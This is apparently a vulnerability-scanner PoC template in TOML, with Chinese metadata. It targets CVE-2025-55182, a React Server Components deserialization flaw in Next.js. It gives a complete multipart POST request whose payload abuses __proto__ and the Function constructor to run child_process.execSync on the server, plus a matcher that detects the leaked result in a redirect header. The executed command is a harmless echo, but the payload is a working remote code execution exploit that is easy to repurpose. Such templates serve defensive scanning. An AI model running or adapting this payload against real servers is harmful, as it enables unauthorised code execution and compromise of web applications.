[info]
author = "ave"
description = "通过发送特制的 multipart/form-data POST 请求到 Next.js 服务端，利用 React Server Components 的 RSC 协议反序列化漏洞（CWE-502），触发远程代码执行。验证方式为发送包含原型链污染载荷的请求，检测响应头中是否包含 X-Action-Redirect 且携带算术运算结果。"
id = "POC-AVE-2025-0106"
name = "React Server Components 反序列化远程代码执行漏洞 PoC"
severity = "critical"
tags = ["ave-2025-0106"]
vuln_id = [
    "CVE-2025-55182",
    "AVE-2025-0106",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{"then":"$B1337"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo 1337').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"
[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
"""
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
Next-Action = "x"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["x-action-redirect"]
